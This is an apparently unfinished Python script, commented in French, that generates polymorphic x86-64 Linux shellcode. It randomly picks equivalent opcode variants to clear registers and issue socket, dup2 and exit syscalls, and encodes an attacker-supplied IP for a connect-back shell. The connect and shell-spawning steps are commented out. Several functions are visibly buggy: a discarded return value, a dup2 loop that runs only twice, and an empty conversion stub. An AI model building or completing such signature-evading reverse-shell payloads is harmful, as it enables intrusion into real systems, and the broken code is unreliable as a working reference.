#/usr/bin/env python3

from random import randint as r
import socket
from sys import argv
#import htons

def clean(reg):
    if str(reg) == "rax":
        l = ["4831C0", "4829c0", "48c1e810"]
        return l[r(0,2)]
    elif str(reg) == "rbx":
        l = ["4831db","4829db", "48c1eb10"]
        return l[r(0,2)]
    elif str(reg) == "rcx":
        l = ["4831c9","4829c9", "48c1e910"]
        return l[r(0,2)]
    elif str(reg) == "rdx":
        l = ["4831d2","4829d2", "48c1ea10"]
        return l[r(0,2)]


def ip_to_opcode(ip):
    ip_array = ip.split('.')
    pi = ip_array[3] +'.'+ip_array[2]+'.'+ip_array[1]+'.'+ip_array[0]
    hexpi = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, pi.split('.')))
    print(hexpi)


def create_socket():
    global PAYLOAD
    # On set rax à 41 (le premier cas correspond à "add rax,41" le deuxième à "mov rax, 0x29")
    PAYLOAD += "b029" if r(0,1) else "0429"
    # On set rbx à 2 pour ensuite le copier dans rdi (le premier cas correspond à "mov bl, 0x02; mov rdi, rbx" le deuxième à "add bl, 0x02, mov rdi, rbx" le troisième correspond à un "inc rdi, inc rdi")
    rand = r(0,2)
    if rand == 0:
        PAYLOAD += "b3024889df"
    elif rand == 1:
        PAYLOAD += "80c3024889df"
    elif rand == 2:
        PAYLOAD += "48ffc748ffc7"
    clean("rbx")
    # On set rbx à 1 pour ensuite le copier dans rsi (le premier cas correspond à "mov bl, 0x01; mov rsi, rbx" le deuxième à "add bl, 0x01, mov rsi, rbx" le troisième correspond à "inc rsi")
    rand = r(0,2)
    if rand == 0:
        PAYLOAD += "b3014889de"
    elif rand == 1:
        PAYLOAD += "80c3014889de"
    elif rand == 2:
        PAYLOAD += "48ffc6"
    PAYLOAD += call()
    return PAYLOAD
    


#def socket_connect(ip, port):
    #global PAYLOAD



def dup2x3():
    global PAYLOAD
    for i in range(0,2):
        PAYLOAD += "b03f"
        PAYLOAD += call()


#def shell():
    #global PAYLOAD

def _exit():
    global PAYLOAD
    PAYLOAD+=clean("rax")
    PAYLOAD+=clean("rdx")
    PAYLOAD+="b03c"
   # print(PAYLOAD)
    PAYLOAD += call()


def call():
    l = ["cd80","0f05"]
    return str(l[r(0,1)])

def bit_to_opcode(payload):
    byte = ""
#    for x in range(0, len(payload)-2, 2):
    return byte



PAYLOAD = ""
PAYLOAD += clean("rax")
PAYLOAD += clean("rbx")
PAYLOAD += clean("rcx")
PAYLOAD += clean("rdx")
create_socket()
dup2x3()
#print(PAYLOAD)
_exit()
ip_to_opcode(argv[1])
#print(bit_to_opcode(PAYLOAD))
print(PAYLOAD)
